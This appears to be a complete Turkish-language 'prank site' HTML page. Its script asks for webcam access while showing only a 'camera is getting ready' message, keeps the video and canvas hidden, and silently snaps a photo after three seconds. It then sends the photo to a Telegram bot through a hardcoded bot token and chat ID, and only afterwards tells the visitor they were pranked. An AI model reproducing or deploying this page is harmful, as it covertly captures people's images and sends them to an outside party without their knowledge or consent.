<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Şaka Sitesi</title>
  <style>
    body { 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      height: 100vh; 
      background: #111; 
      color: white; 
      font-family: Arial, sans-serif; 
      text-align: center;
    }
    video, canvas { display: none; }
    h1 { font-size: 2em; }
  </style>
</head>
<body>
  <h1>Kamera hazırlanıyor...</h1>
  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    // Telegram bot bilgileri
    const BOT_TOKEN = "8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I";
    const CHAT_ID = "8494445812";

    // Kamerayı aç
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        // 3 saniye sonra fotoğraf çek
        setTimeout(() => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          ctx.drawImage(video, 0, 0);

          // Fotoğrafı base64 al
          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", blob, "photo.png");

            // Telegram’a gönder
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
              method: "POST",
              body: formData
            }).then(() => {
              document.body.innerHTML = "<h1>Şakalandın dostum 😃</h1>";
            }).catch(() => {
              document.body.innerHTML = "<h1>Fotoğraf gönderilemedi 😅</h1>";
            });
          });
        }, 3000);
      })
      .catch(err => {
        document.body.innerHTML = "<h1>Kamera izni vermedin 😅</h1>";
      });
  </script>
</body>
</html>
